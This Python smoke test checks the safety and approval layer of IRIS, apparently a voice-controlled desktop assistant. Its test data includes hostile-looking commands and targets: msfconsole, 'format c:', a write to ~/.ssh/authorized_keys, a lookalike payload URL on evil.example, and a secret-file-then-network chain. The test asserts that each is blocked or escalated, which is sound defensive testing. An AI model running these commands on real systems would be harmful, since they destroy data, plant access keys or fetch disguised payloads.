"""
IRIS single-session smoke test.

This script exercises the core milestone path without requiring a microphone,
speaker, or live browser interaction:

- wake-word parsing
- chat response flow
- action execution with verification
- hard-blocked safety path
"""

from __future__ import annotations

from datetime import timedelta
from pathlib import Path
import sys

WORKSPACE = Path(__file__).resolve().parents[1]
if str(WORKSPACE) not in sys.path:
    sys.path.insert(0, str(WORKSPACE))

from config import Config
from core.engine import IRISEngine


def assert_true(condition: bool, message: str) -> None:
    if not condition:
        raise AssertionError(message)


class FakeDesktop:
    def __init__(self) -> None:
        self.events: list[tuple[str, object]] = []
        self.current_window_title = "SmokePad"
        self.windows = [
            {"title": "SmokePad", "left": 10, "top": 20, "width": 900, "height": 700, "active": True},
            {"title": "Claude", "left": 100, "top": 120, "width": 1200, "height": 800, "active": False},
            {"title": "Chrome", "left": 250, "top": 160, "width": 1400, "height": 900, "active": False},
        ]

    def type_text(self, text: str, interval: float = 0.02):
        self.events.append(("type_text", text))

    def type_in_window(self, title_query: str, text: str, interval: float = 0.02):
        self.current_window_title = title_query
        self.events.append(("type_in_window", (title_query, text)))

    def press_hotkey(self, keys: list[str]):
        self.events.append(("press_hotkey", tuple(keys)))

    def press_hotkey_in_window(self, title_query: str, keys: list[str]):
        self.current_window_title = title_query
        self.events.append(("press_hotkey_in_window", (title_query, tuple(keys))))

    def click_at(self, x: int, y: int, button: str = "left", clicks: int = 1):
        self.events.append(("click_at", (x, y, button, clicks)))

    def get_active_window_title(self) -> str:
        return self.current_window_title

    def focus_window(self, title_query: str):
        self.current_window_title = title_query
        self.events.append(("focus_window", title_query))
        class Result:
            message = f"Focused '{title_query}'."
        return Result()

    def describe_active_window(self) -> str:
        for item in self.windows:
            if item["title"] == self.current_window_title:
                return (
                    f"Active window: {item['title']} at {item['left']},{item['top']} "
                    f"sized {item['width']}x{item['height']}."
                )
        return f"Active window: {self.current_window_title}."

    def list_windows(self, limit: int = 8):
        class Snapshot:
            def __init__(self, title, left, top, width, height, active):
                self.title = title
                self.left = left
                self.top = top
                self.width = width
                self.height = height
                self.active = active

        snapshots = []
        for item in self.windows[:limit]:
            snapshots.append(
                Snapshot(
                    item["title"],
                    item["left"],
                    item["top"],
                    item["width"],
                    item["height"],
                    item["title"] == self.current_window_title,
                )
            )
        return snapshots

    def list_window_titles(self, limit: int = 8):
        return [item["title"] for item in self.windows[:limit]]

    def click_window(self, title_query: str, x=None, y=None, button="left", clicks=1):
        self.current_window_title = title_query
        self.events.append(("click_window", (title_query, x, y, button, clicks)))
        class Result:
            message = "Done."
        return Result()

    def set_window_state(self, title_query: str, state: str):
        self.current_window_title = title_query
        self.events.append(("window_state", (title_query, state)))
        class Result:
            def __init__(self, title: str, desired_state: str):
                self.message = f"{desired_state.capitalize()}d '{title}'."
        return Result(title_query, state)


def main() -> None:
    smoke_dir = WORKSPACE / "build" / "smoke"
    smoke_dir.mkdir(parents=True, exist_ok=True)
    smoke_file = smoke_dir / "iris_smoke_note.txt"
    sensitive_smoke_file = smoke_dir / "smoke_token.env"
    actions_log = smoke_dir / "iris_actions.log"
    audit_log = smoke_dir / "iris_audit.log"
    if smoke_file.exists():
        smoke_file.unlink()
    if sensitive_smoke_file.exists():
        sensitive_smoke_file.unlink()
    if actions_log.exists():
        actions_log.unlink()
    if audit_log.exists():
        audit_log.unlink()

    engine = IRISEngine(text_mode=True)
    spoken_messages: list[str] = []
    fake_desktop = FakeDesktop()

    original_speak = engine.voice.speak
    original_think = engine.brain.think
    original_think_with_stream = engine.brain.think_with_stream
    original_pattern_match = engine.executor._pattern_match
    original_manage_package = engine.executor._manage_package
    original_run_command = engine.executor._run_command
    original_plan_action_json = engine.executor.brain.plan_action_json

    def fake_speak(text: str) -> None:
        spoken_messages.append(text)

    def fake_think(user_input: str, council_packet=None) -> str:
        return "Smoke response ready."

    def fake_think_with_stream(user_input: str, council_packet=None, stream_callback=None) -> str:
        return "Smoke response ready."

    def fake_pattern_match(user_input: str):
        if user_input == "run smoke action":
            return {
                "action_type": "create_file",
                "description": "create a smoke note",
                "filename": str(smoke_file),
                "content": "IRIS smoke test artifact\n",
                "is_dangerous": False,
            }
        if user_input == "run smoke blocked action":
            return {
                "action_type": "run_command",
                "description": "launch a blocked command",
                "command": "msfconsole",
                "is_dangerous": True,
            }
        if user_input == "run smoke safe command":
            return {
                "action_type": "run_command",
                "description": "run a safe smoke command",
                "command": "echo smoke",
                "is_dangerous": False,
            }
        if user_input == "run smoke warning action":
            return {
                "action_type": "open_app",
                "description": "open a Pastebin URL",
                "app_name": "chrome",
                "url": "https://pastebin.com/raw/example",
                "is_dangerous": False,
            }
        if user_input.startswith("run smoke auto folder "):
            suffix = user_input.rsplit(" ", 1)[-1]
            return {
                "action_type": "create_folder",
                "description": f"create smoke folder {suffix}",
                "filename": str(smoke_dir / f"auto_{suffix}"),
                "is_dangerous": False,
            }
        if user_input == "run smoke type action":
            return {
                "action_type": "type_text",
                "description": "type smoke text into the focused app",
                "text_to_type": "IRIS desktop smoke",
                "is_dangerous": False,
            }
        if user_input == "run smoke type in window":
            return {
                "action_type": "type_in_window",
                "description": "type smoke text into the Claude window",
                "text_to_type": "IRIS targeted smoke",
                "window_title": "Claude",
                "is_dangerous": False,
            }
        if user_input == "run smoke list windows":
            return {
                "action_type": "list_windows",
                "description": "list visible windows",
                "is_dangerous": False,
            }
        if user_input == "run smoke active window":
            return {
                "action_type": "active_window",
                "description": "describe the active window",
                "is_dangerous": False,
            }
        if user_input == "run smoke click window":
            return {
                "action_type": "click_window",
                "description": "click in the Claude window",
                "window_title": "Claude",
                "button": "left",
                "clicks": 1,
                "is_dangerous": False,
            }
        if user_input == "run smoke hotkey window":
            return {
                "action_type": "press_hotkey_in_window",
                "description": "send ctrl+l to the Chrome window",
                "window_title": "Chrome",
                "keys": ["ctrl", "l"],
                "is_dangerous": False,
            }
        if user_input == "run smoke maximize window":
            return {
                "action_type": "window_state",
                "description": "maximize the Claude window",
                "window_title": "Claude",
                "window_state": "maximize",
                "is_dangerous": False,
            }
        if user_input == "run smoke close window":
            return {
                "action_type": "window_state",
                "description": "close the Claude window",
                "window_title": "Claude",
                "window_state": "close",
                "is_dangerous": True,
            }
        if user_input == "run smoke package list":
            return {
                "action_type": "manage_package",
                "description": "list installed applications",
                "package_operation": "list",
                "package_name": "",
                "command": "winget list",
                "is_dangerous": False,
            }
        if user_input == "run smoke package install":
            return {
                "action_type": "manage_package",
                "description": "install Git",
                "package_operation": "install",
                "package_name": "Git",
                "command": 'winget install --name "Git" --accept-package-agreements --accept-source-agreements',
                "is_dangerous": False,
            }
        if user_input == "run smoke package uninstall":
            return {
                "action_type": "manage_package",
                "description": "uninstall Git",
                "package_operation": "uninstall",
                "package_name": "Git",
                "command": 'winget uninstall --name "Git"',
                "is_dangerous": True,
            }
        if user_input == "run smoke chain step 1":
            return {
                "action_type": "create_file",
                "description": "create a sensitive smoke env file",
                "filename": str(sensitive_smoke_file),
                "content": "token=smoke-secret\n",
                "is_dangerous": False,
            }
        if user_input == "run smoke chain step 2":
            return {
                "action_type": "search_web",
                "description": "search the web for smoke token.env follow-up",
                "search_query": "inspect smoke_token.env",
                "is_dangerous": False,
            }
        return original_pattern_match(user_input)

    try:
        engine.executor.log_file = str(actions_log)
        engine.executor.audit_file = str(audit_log)
        engine.executor._desktop = fake_desktop
        engine.voice.speak = fake_speak
        engine.brain.think = fake_think
        engine.brain.think_with_stream = fake_think_with_stream
        engine.executor._pattern_match = fake_pattern_match

        package_events: list[tuple[str, str]] = []

        def fake_manage_package(plan: dict):
            operation = plan.get("package_operation", "")
            package_name = plan.get("package_name", "")
            package_events.append((operation, package_name))
            if operation == "list":
                return "Installed apps:\n- Git\n- Python\n- PowerToys", True
            if operation == "install":
                return f"Installed '{package_name}'.", True
            if operation == "uninstall":
                return f"Uninstalled '{package_name}'.", True
            if operation == "upgrade":
                return f"Updated '{package_name}'.", True
            return "Unsupported package operation.", False

        engine.executor._manage_package = fake_manage_package
        engine.executor._run_command = lambda plan: "Done. smoke command complete."  # type: ignore[method-assign]

        assert_true(engine.contains_wake_word("iris status check"), "Wake-word detection failed.")
        assert_true(
            engine.strip_wake_word("iris status check") == "status check",
            "Wake-word stripping failed.",
        )

        chat_result = engine.process_user_input("give me a smoke response", speak_response=True)
        assert_true(chat_result.response == "Smoke response ready.", "Chat flow returned the wrong response.")
        assert_true(spoken_messages[-1] == "Smoke response ready.", "Chat response was not routed to speech.")

        action_result = engine.process_user_input("run smoke action", speak_response=True)
        assert_true(smoke_file.exists(), "Smoke action did not create the expected file.")
        assert_true(
            "created" in action_result.response.lower(),
            "Smoke action did not report a verified creation result.",
        )
        assert_true(spoken_messages[-1] == action_result.response, "Action result was not routed to speech.")

        voice_file_prompt = engine.process_user_input("run smoke action", speak_response=True, input_source="voice")
        assert_true(
            engine.executor.waiting_for_permission(),
            "Voice-origin file creation should wait for confirmation.",
        )
        assert_true(
            "voice-confirmed file change" in voice_file_prompt.response.lower()
            or "came from voice input" in voice_file_prompt.response.lower(),
            "Voice-origin file creation did not surface the explicit approval reason.",
        )
        voice_file_result = engine.process_user_input("yes", speak_response=True, input_source="voice")
        assert_true(
            "created" in voice_file_result.response.lower(),
            "Voice-origin file creation did not execute after approval.",
        )

        engine.voice.last_transcript_uncertain = True
        engine.voice.last_uncertain_transcript = "open smoke file"
        engine.voice.last_uncertain_transcript_backend = "faster_whisper"
        uncertain_voice_result = engine.process_user_input(
            "open smoke file",
            speak_response=True,
            input_source="voice",
        )
        assert_true(
            uncertain_voice_result.mode == "voice-repeat",
            "Weak voice transcripts should trigger a repeat prompt instead of normal execution.",
        )
        assert_true(
            "sounded uncertain" in uncertain_voice_result.response.lower(),
            "Weak voice transcripts did not return the expected repeat prompt.",
        )
        assert_true(
            spoken_messages[-1] == uncertain_voice_result.response,
            "Weak voice transcript prompt was not routed to speech.",
        )
        engine.voice.last_transcript_uncertain = False
        engine.voice.last_uncertain_transcript = ""
        engine.voice.last_uncertain_transcript_backend = ""

        followup_result = engine.process_user_input("no", speak_response=True)
        assert_true(followup_result.response == "No problem.", "Follow-up handling did not close cleanly.")
        assert_true(spoken_messages[-1] == "No problem.", "Follow-up response was not routed to speech.")

        blocked_result = engine.process_user_input("run smoke blocked action", speak_response=True)
        assert_true(
            "blocked by the safety contract" in blocked_result.response.lower(),
            "Blocked action did not return the expected safety-contract message.",
        )
        assert_true(
            not engine.executor.waiting_for_permission(),
            "Blocked action should not leave IRIS waiting for permission.",
        )

        warning_result = engine.process_user_input("run smoke warning action", speak_response=True)
        assert_true(
            engine.executor.waiting_for_permission(),
            "Warning-grade action should wait for confirmation.",
        )
        assert_true(
            "pastebin" in warning_result.response.lower(),
            "Warning-grade Pastebin action did not return the expected message.",
        )
        cancel_result = engine.process_user_input("no", speak_response=True)
        assert_true(cancel_result.response == "Cancelled.", "Warning action did not cancel cleanly.")

        unsafe_write_path = Path.home() / ".ssh" / "authorized_keys"
        unsafe_write_result = engine.executor._write_to_file(
            {
                "filename": str(unsafe_write_path),
                "content": "smoke key",
            }
        )
        assert_true(
            "restricted system or credential area" in unsafe_write_result.lower(),
            "Unsafe write target was not rejected.",
        )

        safe_append_file = smoke_dir / "safe_append.txt"
        if safe_append_file.exists():
            safe_append_file.unlink()
        safe_write_result = engine.executor._write_to_file(
            {
                "filename": str(safe_append_file),
                "content": "safe smoke append",
            }
        )
        assert_true(safe_write_result == "Done.", "Safe write target did not append successfully.")
        assert_true(
            "safe smoke append" in safe_append_file.read_text(encoding="utf-8"),
            "Safe write target did not receive the appended content.",
        )

        planner_calls: list[dict] = []
        engine.executor.brain.plan_action_json = lambda prompt: planner_calls.append(  # type: ignore[method-assign]
            {"prompt": prompt, "max_tokens": Config.ACTION_PLAN_MAX_TOKENS}
        ) or '{"action_type":"unsupported"}'
        plan = engine.executor._ai_plan("perform a novel smoke action")
        assert_true(
            plan is not None and plan.get("action_type") == "unsupported",
            "AI planner smoke did not parse the mocked JSON response.",
        )
        assert_true(
            planner_calls and planner_calls[-1].get("max_tokens") == Config.ACTION_PLAN_MAX_TOKENS,
            "AI planner did not request the dedicated action-planning token budget.",
        )
        engine.executor.brain.plan_action_json = original_plan_action_json

        safe_command_prompt = engine.process_user_input("run smoke safe command", speak_response=True)
        assert_true(
            engine.executor.waiting_for_permission(),
            "Shell commands should wait for explicit approval even when they look benign.",
        )
        assert_true(
            "shell command" in safe_command_prompt.response.lower(),
            "Shell-command approval prompt did not surface the explicit approval reason.",
        )
        original_correct_input = engine.autocorrect.correct_input
        engine.autocorrect.correct_input = lambda text: ("yes", 1.0)  # type: ignore[method-assign]
        unrelated_permission_input = engine.process_user_input("what's the weather?", speak_response=True)
        assert_true(
            unrelated_permission_input.response == "Go ahead, or cancel?",
            "Pending permissions should not autocorrect unrelated input into an approval.",
        )
        engine.autocorrect.correct_input = original_correct_input
        safe_command_result = engine.process_user_input("yes", speak_response=True)
        assert_true(
            "confirmed. running: echo smoke." in safe_command_result.response.lower()
            and "smoke command complete" in safe_command_result.response.lower(),
            "Shell command did not echo the exact command before execution.",
        )

        timed_out_prompt = engine.process_user_input("run smoke safe command", speak_response=True)
        assert_true(
            engine.executor.waiting_for_permission(),
            "Timed-out shell command setup should still start with a live pending approval.",
        )
        engine.executor.pending_action_started_at = (
            engine.executor.pending_action_started_at - timedelta(seconds=Config.APPROVAL_TIMEOUT_SECONDS + 5)
        )
        timed_out_result = engine.process_user_input("yes", speak_response=True)
        assert_true(
            "timed out" in timed_out_result.response.lower(),
            "Expired pending approval did not return the timeout message.",
        )
        assert_true(
            not engine.executor.waiting_for_permission(),
            "Expired pending approval should clear instead of remaining live.",
        )
        post_timeout_chat = engine.process_user_input("give me a smoke response", speak_response=True)
        assert_true(
            post_timeout_chat.response == "Smoke response ready.",
            "Executor did not return to normal routing after a timed-out approval.",
        )

        desktop_warning = engine.process_user_input("run smoke type action", speak_response=True)
        assert_true(
            engine.executor.waiting_for_permission(),
            "Desktop typing action should wait for confirmation.",
        )
        assert_true(
            "currently focused app" in desktop_warning.response.lower(),
            "Desktop typing action did not return the expected confirmation warning.",
        )
        desktop_result = engine.process_user_input("yes", speak_response=True)
        assert_true(desktop_result.response == "Done.", "Desktop typing action did not execute cleanly.")
        assert_true(
            ("type_text", "IRIS desktop smoke") in fake_desktop.events,
            "Desktop typing action did not reach the desktop controller.",
        )

        desktop_memory_prompt = engine.process_user_input("run smoke type action", speak_response=True)
        assert_true(
            engine.executor.waiting_for_permission(),
            "Desktop typing action should still require permission before session approval is remembered.",
        )
        desktop_memory_result = engine.process_user_input("always for this session", speak_response=True)
        assert_true(
            desktop_memory_result.response == "Done.",
            "Desktop typing action did not execute after session approval memory was granted.",
        )
        fake_desktop.current_window_title = "Different Window"
        desktop_other_window = engine.process_user_input("run smoke type action", speak_response=True)
        assert_true(
            engine.executor.waiting_for_permission(),
            "Desktop session approval should not be reused when the focused window changes.",
        )
        engine.process_user_input("no", speak_response=True)
        fake_desktop.current_window_title = "SmokePad"
        desktop_auto = engine.process_user_input("run smoke type action", speak_response=True)
        assert_true(
            desktop_auto.response == "Done.",
            "Desktop session approval was not reused for the same focused window.",
        )
        assert_true(
            not engine.executor.waiting_for_permission(),
            "Remembered desktop approval should execute without leaving IRIS waiting for permission.",
        )

        focus_result = engine.process_user_input("focus Claude", speak_response=True)
        assert_true(
            focus_result.response == "Focused 'Claude'.",
            "Named window focus did not return the expected result.",
        )
        assert_true(
            ("focus_window", "Claude") in fake_desktop.events,
            "Named window focus did not reach the desktop controller.",
        )

        type_window_warning = engine.process_user_input("run smoke type in window", speak_response=True)
        assert_true(
            engine.executor.waiting_for_permission(),
            "Window-targeted typing should wait for confirmation.",
        )
        assert_true(
            "claude" in type_window_warning.response.lower(),
            "Window-targeted typing warning did not mention the target window.",
        )
        type_window_result = engine.process_user_input("always for this session", speak_response=True)
        assert_true(
            type_window_result.response == "Done.",
            "Window-targeted typing did not execute after approval.",
        )
        assert_true(
            ("type_in_window", ("Claude", "IRIS targeted smoke")) in fake_desktop.events,
            "Window-targeted typing did not reach the desktop controller.",
        )
        type_window_auto = engine.process_user_input("run smoke type in window", speak_response=True)
        assert_true(
            type_window_auto.response == "Done.",
            "Window-targeted typing session approval was not reused.",
        )
        assert_true(
            not engine.executor.waiting_for_permission(),
            "Remembered targeted typing approval should execute immediately.",
        )

        hotkey_window_warning = engine.process_user_input("run smoke hotkey window", speak_response=True)
        assert_true(
            engine.executor.waiting_for_permission(),
            "Window-targeted shortcut should wait for confirmation.",
        )
        hotkey_window_result = engine.process_user_input("yes", speak_response=True)
        assert_true(
            hotkey_window_result.response == "Done.",
            "Window-targeted shortcut did not execute after confirmation.",
        )
        assert_true(
            ("press_hotkey_in_window", ("Chrome", ("ctrl", "l"))) in fake_desktop.events,
            "Window-targeted shortcut did not reach the desktop controller.",
        )

        maximize_window_result = engine.process_user_input("run smoke maximize window", speak_response=True)
        assert_true(
            maximize_window_result.response == "Maximized 'Claude'.",
            "Window maximize action did not execute as a safe auto action.",
        )
        assert_true(
            ("window_state", ("Claude", "maximize")) in fake_desktop.events,
            "Window maximize action did not reach the desktop controller.",
        )

        list_windows_result = engine.process_user_input("run smoke list windows", speak_response=True)
        assert_true(
            "Visible windows:" in list_windows_result.response,
            "List windows action did not return the expected inspection output.",
        )
        assert_true(
            "Claude" in list_windows_result.response and "Chrome" in list_windows_result.response,
            "List windows action did not include the expected window titles.",
        )

        active_window_result = engine.process_user_input("run smoke active window", speak_response=True)
        assert_true(
            "Active window:" in active_window_result.response,
            "Active window action did not report the focused window.",
        )

        click_window_warning = engine.process_user_input("run smoke click window", speak_response=True)
        assert_true(
            engine.executor.waiting_for_permission(),
            "Window click action should wait for confirmation.",
        )
        assert_true(
            "claude" in click_window_warning.response.lower(),
            "Window click action did not mention the target window in its warning.",
        )
        click_window_result = engine.process_user_input("yes", speak_response=True)
        assert_true(
            click_window_result.response == "Done.",
            "Window click action did not execute cleanly after confirmation.",
        )
        assert_true(
            ("click_window", ("Claude", None, None, "left", 1)) in fake_desktop.events,
            "Window click action did not reach the desktop controller.",
        )

        close_window_warning = engine.process_user_input("run smoke close window", speak_response=True)
        assert_true(
            engine.executor.waiting_for_permission(),
            "Window close action should wait for confirmation.",
        )
        assert_true(
            "discard unsaved work" in close_window_warning.response.lower(),
            "Window close warning did not surface the unsaved-work risk.",
        )
        close_window_result = engine.process_user_input("yes", speak_response=True)
        assert_true(
            close_window_result.response == "Closed 'Claude'.",
            "Window close action did not execute cleanly after confirmation.",
        )
        assert_true(
            ("window_state", ("Claude", "close")) in fake_desktop.events,
            "Window close action did not reach the desktop controller.",
        )

        engine.executor.auto_action_timestamps = []
        package_list_result = engine.process_user_input("run smoke package list", speak_response=True)
        assert_true(
            "Installed apps:" in package_list_result.response,
            "Package list action did not return the installed-app summary.",
        )
        assert_true(
            ("list", "") in package_events,
            "Package list action did not reach the package manager path.",
        )

        package_install_warning = engine.process_user_input("run smoke package install", speak_response=True)
        assert_true(
            engine.executor.waiting_for_permission(),
            "Package install action should wait for confirmation.",
        )
        package_install_result = engine.process_user_input("yes", speak_response=True)
        assert_true(
            "confirmed. running:" in package_install_result.response.lower()
            and "installed 'git'." in package_install_result.response.lower(),
            "Package install action did not echo the exact command before execution.",
        )
        assert_true(
            ("install", "Git") in package_events,
            "Package install action did not reach the package manager path.",
        )

        package_uninstall_warning = engine.process_user_input("run smoke package uninstall", speak_response=True)
        assert_true(
            engine.executor.waiting_for_permission(),
            "Package uninstall action should wait for confirmation.",
        )
        package_uninstall_result = engine.process_user_input("yes", speak_response=True)
        assert_true(
            "confirmed. running:" in package_uninstall_result.response.lower()
            and "uninstalled 'git'." in package_uninstall_result.response.lower(),
            "Package uninstall action did not echo the exact command before execution.",
        )
        assert_true(
            ("uninstall", "Git") in package_events,
            "Package uninstall action did not reach the package manager path.",
        )

        chain_step_one = engine.process_user_input("run smoke chain step 1", speak_response=True)
        assert_true(sensitive_smoke_file.exists(), "Sensitive smoke chain file was not created.")
        assert_true(
            "created" in chain_step_one.response.lower(),
            "Sensitive smoke chain setup action did not report success.",
        )
        chain_step_two = engine.process_user_input("run smoke chain step 2", speak_response=True)
        assert_true(
            engine.executor.waiting_for_permission(),
            "Sensitive file -> network chain should escalate to a confirmation warning.",
        )
        assert_true(
            "sensitive path" in chain_step_two.response.lower() or "browser or network-capable action" in chain_step_two.response.lower(),
            "Action-chain escalation warning did not surface.",
        )
        chain_cancel = engine.process_user_input("no", speak_response=True)
        assert_true(chain_cancel.response == "Cancelled.", "Escalated action chain did not cancel cleanly.")

        engine.executor.auto_action_timestamps = []
        for idx in range(1, 5):
            auto_result = engine.process_user_input(f"run smoke auto folder {idx}", speak_response=True)
        assert_true(
            "still with you" in auto_result.response.lower(),
            "Rapid AUTO sequence did not trigger the presence check.",
        )
        presence_result = engine.process_user_input("yes", speak_response=True)
        assert_true(
            presence_result.response == "All right. Continuing.",
            "Presence check confirmation did not clear cleanly.",
        )

        overdrive_on = engine.process_user_input("activate overdrive", speak_response=True)
        assert_true(engine.overdrive_active, "Overdrive activation command did not enable Overdrive.")
        assert_true(
            "overdrive is active" in overdrive_on.response.lower(),
            "Overdrive activation did not return the expected response.",
        )
        overdrive_status = engine.process_user_input("overdrive status", speak_response=True)
        assert_true(
            "overdrive is active" in overdrive_status.response.lower(),
            "Overdrive status command did not report the live state.",
        )
        overdrive_off = engine.process_user_input("deactivate overdrive", speak_response=True)
        assert_true(not engine.overdrive_active, "Overdrive deactivation command did not disable Overdrive.")
        assert_true(
            "overdrive is off" in overdrive_off.response.lower(),
            "Overdrive deactivation did not return the expected response.",
        )

        spoken_count_before_terminate = len(spoken_messages)
        terminate_result = engine.process_user_input("please terminate the app", speak_response=True)
        assert_true(terminate_result.should_exit, "Terminate command did not request shutdown.")
        assert_true(terminate_result.mode == "terminate", "Terminate command did not use the terminate mode.")
        assert_true(
            terminate_result.exit_immediately,
            "Terminate command should mark the shutdown as immediate.",
        )
        assert_true(
            terminate_result.response == "Terminating now.",
            "Terminate command did not return the expected response.",
        )
        assert_true(
            len(spoken_messages) == spoken_count_before_terminate,
            "Terminate command should not route a delayed spoken farewell before exit.",
        )

        security = engine.executor.security
        assert_true(
            security.assess({"action_type": "run_command", "command": "msfconsole"})[0] == "BLOCKED",
            "Metasploit-style commands must be blocked.",
        )
        assert_true(
            security.assess({"action_type": "run_command", "command": "format c:"})[0] == "BLOCKED",
            "Disk-format commands must be blocked.",
        )
        assert_true(
            security.assess({"action_type": "run_command", "command": "winget install Git.Git"})[0] == "NEED_ADMIN",
            "Winget installs must require admin approval.",
        )
        spoofed_url_verdict, spoofed_url_message = security.assess(
            {
                "action_type": "open_app",
                "description": "open a spoofed GitHub URL",
                "url": "https://github.com.evil.example/payload.exe",
                "command": 'start "" "https://github.com.evil.example/payload.exe"',
                "is_dangerous": False,
            }
        )
        assert_true(
            spoofed_url_verdict == "WARNING",
            "Spoofed lookalike domains must not be treated as trusted sources.",
        )
        assert_true(
            "unverified source" in spoofed_url_message.lower(),
            "Spoofed lookalike domains should surface the unverified-source warning.",
        )
        assert_true(audit_log.exists(), "Audit log was not created during smoke test.")
        audit_text = audit_log.read_text(encoding="utf-8")
        assert_true(
            "BLOCKED | run_command | msfconsole | SOURCE(text)" in audit_text,
            "Audit log did not capture the blocked-attempt event.",
        )
        assert_true(
            "CONFIRM_ONCE_CANCELLED" in audit_text,
            "Audit log did not capture the cancelled warning event.",
        )
        assert_true(
            "CONFIRM_ONCE_TIMED_OUT" in audit_text,
            "Audit log did not capture the timed-out approval event.",
        )
        assert_true(
            "CONFIRM_ONCE_SESSION_APPROVED" in audit_text and "SESSION_APPROVAL_REUSED" in audit_text,
            "Audit log did not capture the session approval memory lifecycle.",
        )
        assert_true(
            "PRESENCE_CHECK_CONFIRMED" in audit_text,
            "Audit log did not capture the rapid-sequence presence confirmation.",
        )
        assert_true(
            "OVERDRIVE_ACTIVATED" in audit_text and "OVERDRIVE_DEACTIVATED" in audit_text,
            "Audit log did not capture the Overdrive activation lifecycle.",
        )

        print("PASS: IRIS single-session smoke test completed.")
        print(f"Artifact: {smoke_file}")
    finally:
        engine.executor.brain.plan_action_json = original_plan_action_json
        engine.voice.speak = original_speak
        engine.brain.think = original_think
        engine.brain.think_with_stream = original_think_with_stream
        engine.executor._pattern_match = original_pattern_match
        engine.executor._manage_package = original_manage_package
        engine.executor._run_command = original_run_command
        engine.shutdown()


if __name__ == "__main__":
    main()
